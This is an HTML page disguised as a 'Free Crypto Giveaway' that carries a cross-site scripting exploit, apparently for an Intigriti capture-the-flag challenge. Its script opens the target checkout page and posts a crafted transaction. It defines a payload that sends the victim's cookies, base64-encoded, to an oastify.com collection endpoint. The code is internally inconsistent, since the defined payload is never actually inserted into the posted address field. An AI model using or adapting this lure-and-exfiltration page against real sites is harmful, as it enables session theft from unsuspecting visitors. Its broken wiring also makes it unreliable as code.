<!DOCTYPE html>
<html lang="en">
<head>
    <title>Free Crypto Giveaway - Limited Time!</title>
    <style>
        body { background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 20%; }
    </style>
</head>
<body>
    <h1>Initializing MarketWatch Exploit...</h1>
    <p>Do not close this tab.</p>

    <script>
        // Use 1337COIN since that's what the Admin holds
        const VICTIM_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
        
        // This payload breaks out of the title="" attribute and injects an image tag
        // that sends the Admin's cookies/local storage to your OAST endpoint.
        const XSS_PAYLOAD = '"><img src=x onerror="window.location=\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?data=\'+btoa(document.cookie)">';
        
        // Step 1: Open the target in a new tab
        const victimWindow = window.open(VICTIM_URL, '_blank');
        
        // Step 2: Wait 4 seconds for the Admin's Wallet API to load
        setTimeout(() => {
            victimWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN',
                    amount: 1, 
                    toAddress: '10970063d33e32396bb80753a2b902d568' // Injecting XSS into the Address field!
                }
            }, '*');
            
            console.log("XSS Payload Injected into Transaction DB!");
        }, 4000); 
    </script>
</body>
</html>
